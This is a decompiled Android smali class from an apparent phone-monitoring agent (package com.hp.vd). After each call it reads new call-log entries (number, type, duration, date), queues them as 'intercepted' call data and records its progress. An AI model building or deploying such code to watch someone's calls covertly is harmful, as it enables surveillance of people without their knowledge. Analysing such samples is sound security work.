.class public Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;
.super Landroid/telephony/PhoneStateListener;
.source "CallBroadcastReceiver.java"


# static fields
.field protected static final TAG:Ljava/lang/String; = "CallMonitor::CallBroadcastReceiver"


# instance fields
.field protected active:Z

.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/CallData;",
            ">;"
        }
    .end annotation
.end field

.field protected context:Lcom/hp/vd/context/Context;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/CallData;",
            ">;",
            "Lcom/hp/vd/context/Context;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 41
    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    const/4 v0, 0x1

    .line 32
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->active:Z

    const/4 v0, 0x0

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->context:Lcom/hp/vd/context/Context;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 37
    iput-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 43
    iput-object p1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 44
    iput-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->context:Lcom/hp/vd/context/Context;

    .line 45
    iput-object p3, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 46
    iput-object p4, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public activate()V
    .locals 1

    const/4 v0, 0x1

    .line 56
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->active:Z

    return-void
.end method

.method public deactivate()V
    .locals 1

    const/4 v0, 0x0

    .line 51
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->active:Z

    return-void
.end method

.method public onCallStateChanged(ILjava/lang/String;)V
    .locals 7

    .line 61
    iget-boolean p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->active:Z

    if-nez p2, :cond_0

    return-void

    :cond_0
    if-eqz p1, :cond_1

    return-void

    .line 69
    :cond_1
    iget-object p1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object p1

    const/4 p2, 0x3

    const/4 v6, 0x2

    .line 74
    :try_start_0
    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "_id > "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_call_id"

    .line 77
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    const-string v5, "_id"

    move-object v0, p1

    .line 74
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0
    :try_end_0
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/SecurityException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    .line 121
    iget-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "CallMonitor::CallBroadcastReceiver"

    const-string v1, "NullPointerException caught"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception p1

    .line 116
    iget-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "CallMonitor::CallBroadcastReceiver"

    const-string v1, "SecurityException caught (without projection)"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_2
    move-exception v0

    .line 83
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "CallMonitor::CallBroadcastReceiver"

    const-string v3, "SQLiteException caught while quering call cursor. Now trying without projection."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v0, 0x5

    .line 85
    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v1, "_id"

    aput-object v1, v2, v0

    const/4 v0, 0x1

    const-string v1, "type"

    aput-object v1, v2, v0

    const-string v0, "number"

    aput-object v0, v2, v6

    const-string v0, "duration"

    aput-object v0, v2, p2

    const/4 v0, 0x4

    const-string v1, "date"

    aput-object v1, v2, v0

    .line 96
    :try_start_1
    sget-object v1, Landroid/provider/CallLog$Calls;->CONTENT_URI:Landroid/net/Uri;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "_id > "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_call_id"

    .line 99
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    const-string v5, "_id"

    move-object v0, p1

    .line 96
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_5
    .catch Ljava/lang/SecurityException; {:try_start_1 .. :try_end_1} :catch_4

    :goto_0
    if-nez v0, :cond_2

    .line 127
    iget-object p1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "CallMonitor::CallBroadcastReceiver"

    const-string v1, "onCallStateChanged(): could not open callLog cursor."

    invoke-interface {p1, v0, v1, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_2
    const/4 p1, 0x0

    .line 138
    :goto_1
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result p2

    if-eqz p2, :cond_3

    .line 140
    new-instance p1, Lcom/hp/vd/data/CallData;

    invoke-direct {p1}, Lcom/hp/vd/data/CallData;-><init>()V

    const-string p2, "_id"

    .line 142
    invoke-interface {v0, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result p2

    invoke-interface {v0, p2}, Landroid/database/Cursor;->getInt(I)I

    move-result p2

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p2

    iput-object p2, p1, Lcom/hp/vd/data/CallData;->internalId:Ljava/lang/Integer;

    const-string p2, "type"

    .line 144
    invoke-interface {v0, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result p2

    invoke-interface {v0, p2}, Landroid/database/Cursor;->getInt(I)I

    move-result p2

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p2

    iput-object p2, p1, Lcom/hp/vd/data/CallData;->type:Ljava/lang/Integer;

    const-string p2, "number"

    .line 145
    invoke-interface {v0, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result p2

    invoke-interface {v0, p2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object p2

    iput-object p2, p1, Lcom/hp/vd/data/CallData;->number:Ljava/lang/String;

    const-string p2, "duration"

    .line 146
    invoke-interface {v0, p2}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result p2

    invoke-interface {v0, p2}, Landroid/database/Cursor;->getInt(I)I

    move-result p2

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p2

    iput-object p2, p1, Lcom/hp/vd/data/CallData;->duration:Ljava/lang/Integer;

    .line 148
    new-instance p2, Ljava/util/Date;

    const-string v1, "date"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v1

    invoke-direct {p2, v1, v2}, Ljava/util/Date;-><init>(J)V

    iput-object p2, p1, Lcom/hp/vd/data/CallData;->createdAt:Ljava/util/Date;

    .line 150
    iget-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-virtual {p2, p1}, Lcom/hp/vd/data/concurrency/BlockingQueue;->put(Ljava/lang/Object;)Z

    .line 152
    iget-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "CallMonitor::CallBroadcastReceiver"

    const-string v2, "onCallStateChanged(): call intercepted and put into the buffer."

    invoke-interface {p2, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 154
    iget-object p1, p1, Lcom/hp/vd/data/CallData;->internalId:Ljava/lang/Integer;

    goto :goto_1

    .line 157
    :cond_3
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    if-nez p1, :cond_4

    .line 160
    iget-object p1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "CallMonitor::CallBroadcastReceiver"

    const-string v0, "onCallStateChanged(): no rows were found with the cursor."

    invoke-interface {p1, p2, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    .line 165
    :cond_4
    iget-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_call_id"

    invoke-virtual {p2, v0}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-static {p2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p2

    .line 171
    :try_start_2
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "max_call_id"

    invoke-virtual {v0, v1, p1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 173
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v0

    .line 174
    iget-object v1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 176
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "CallMonitor::CallBroadcastReceiver"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "onCallStateChanged(): persisted max_call_id = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_3

    goto :goto_2

    :catch_3
    move-exception p1

    .line 179
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    .line 181
    iget-object v0, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "CallMonitor::CallBroadcastReceiver"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "onCallStateChanged(): could not commit max_call_id: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "max_call_id"

    .line 184
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 181
    invoke-interface {v0, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 188
    iget-object p1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_call_id"

    invoke-static {p2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {p1, v0, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 189
    iget-object p1, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "CallMonitor::CallBroadcastReceiver"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "onCallStateChanged(): reverted max_call_id to the old value = "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v0, p2, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :goto_2
    return-void

    :catch_4
    move-exception p1

    .line 110
    iget-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "CallMonitor::CallBroadcastReceiver"

    const-string v1, "SecurityException caught (with projection)"

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_5
    move-exception p1

    .line 105
    iget-object p2, p0, Lcom/hp/vd/module/monitor/call/CallBroadcastReceiver;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "CallMonitor::CallBroadcastReceiver"

    const-string v1, "SQLiteException caught while quering call cursor with projection. Nothing more to try. Exiting..."

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
